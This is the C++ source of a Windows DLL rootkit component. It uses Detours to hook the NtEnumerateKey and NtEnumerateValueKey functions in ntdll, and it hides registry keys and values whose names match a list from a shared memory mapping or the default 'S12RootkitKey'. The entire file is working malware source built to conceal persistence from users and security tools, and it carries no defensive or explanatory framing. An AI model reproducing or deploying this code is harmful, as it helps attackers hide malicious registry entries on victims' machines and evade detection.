#include <stdio.h>
#include <Windows.h>
#include <Shlwapi.h>
#include "pch.h"
#include "detours.h"
#include <string>
#include <vector>
#include <Winternl.h>
#include "resolve.h"

using namespace std;

#define UNICODE
#define HIDE_REG L"S12RootkitKey"

NtEnumerateKey_t origNtEnumerateKey = NULL;
NtEnumerateValueKey_t origNtEnumerateValueKey = NULL;

std::vector<std::wstring> deserializeWStringVector(std::wstring fileName) {
    std::vector<std::wstring> result;

    HANDLE fileMapping = OpenFileMappingW(FILE_MAP_READ, FALSE, fileName.c_str());
    if (!fileMapping || fileMapping == INVALID_HANDLE_VALUE) return result;

    LPVOID mappedView = MapViewOfFile(fileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!mappedView) { CloseHandle(fileMapping); return result; }

    std::wstring serializedData(static_cast<const wchar_t*>(mappedView));
    size_t pos = 0;
    std::wstring token;
    while ((pos = serializedData.find(L',')) != std::wstring::npos) {
        token = serializedData.substr(0, pos);
        result.push_back(token);
        serializedData.erase(0, pos + 1);
    }
    if (!serializedData.empty()) {
        result.push_back(serializedData);
    }

    UnmapViewOfFile(mappedView);
    CloseHandle(fileMapping);

    return result;
}

NTSTATUS NTAPI HookedNtEnumerateKey(HANDLE KeyHandle, ULONG Index, KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation, ULONG Length, PULONG ResultLength) {
    vector<wstring> hideRegs = deserializeWStringVector(L"registryMapped");
    if (hideRegs.empty()) hideRegs.push_back(HIDE_REG);

    NTSTATUS status = origNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);

    // Don't walk a partial or empty buffer on failure
    if (!NT_SUCCESS(status)) return status;

    // Build a length-safe wstring — Name is NOT null-terminated in any KEY_*_INFORMATION struct.
    // wcsstr() on a non-terminated Name reads past the buffer end and crashes.
    std::wstring keyName;
    if (KeyInformationClass == KeyBasicInformation) {
        ULONG nameLen = ((KEY_BASIC_INFORMATION*)KeyInformation)->NameLength;
        keyName = std::wstring(((KEY_BASIC_INFORMATION*)KeyInformation)->Name, nameLen / sizeof(WCHAR));
    }
    else if (KeyInformationClass == KeyNameInformation) {
        ULONG nameLen = ((KEY_NAME_INFORMATION*)KeyInformation)->NameLength;
        keyName = std::wstring(((KEY_NAME_INFORMATION*)KeyInformation)->Name, nameLen / sizeof(WCHAR));
    }
    else {
        return status;  // Unknown class — keyName would be NULL, wcsstr(NULL,...) crashes
    }

    for (const auto& hideReg : hideRegs) {
        if (keyName.find(hideReg) != std::wstring::npos) {
            ZeroMemory(KeyInformation, Length);
            status = STATUS_NO_MORE_ENTRIES;
            break;
        }
    }
    return status;
};

NTSTATUS NTAPI HookedNtEnumerateValueKey(HANDLE KeyHandle, ULONG Index, KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass, PVOID KeyValueInformation, ULONG Length, PULONG ResultLength) {
    vector<wstring> hideRegs = deserializeWStringVector(L"registryMapped");
    if (hideRegs.empty()) hideRegs.push_back(HIDE_REG);

    NTSTATUS status = origNtEnumerateValueKey(KeyHandle, Index, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);

    if (!NT_SUCCESS(status)) return status;

    std::wstring keyValueName;
    if (KeyValueInformationClass == KeyValueBasicInformation) {
        ULONG nameLen = ((KEY_VALUE_BASIC_INFORMATION*)KeyValueInformation)->NameLength;
        keyValueName = std::wstring(((KEY_VALUE_BASIC_INFORMATION*)KeyValueInformation)->Name, nameLen / sizeof(WCHAR));
    }
    else if (KeyValueInformationClass == KeyValueFullInformation) {
        ULONG nameLen = ((KEY_VALUE_FULL_INFORMATION*)KeyValueInformation)->NameLength;
        keyValueName = std::wstring(((KEY_VALUE_FULL_INFORMATION*)KeyValueInformation)->Name, nameLen / sizeof(WCHAR));
    }
    else {
        return status;
    }

    for (const auto& hideReg : hideRegs) {
        if (keyValueName.find(hideReg) != std::wstring::npos) {
            ZeroMemory(KeyValueInformation, Length);
            status = STATUS_NO_MORE_ENTRIES;
            break;
        }
    }
    return status;
};

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
        origNtEnumerateValueKey = (NtEnumerateValueKey_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtEnumerateValueKey");
        origNtEnumerateKey = (NtEnumerateKey_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtEnumerateKey");
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)origNtEnumerateValueKey, HookedNtEnumerateValueKey);
        DetourAttach(&(PVOID&)origNtEnumerateKey, HookedNtEnumerateKey);
        DetourTransactionCommit();
        break;
    }
    case DLL_PROCESS_DETACH:
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)origNtEnumerateValueKey, HookedNtEnumerateValueKey);
        DetourDetach(&(PVOID&)origNtEnumerateKey, HookedNtEnumerateKey);  // was commented out
        DetourTransactionCommit();
        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }

    return TRUE;
}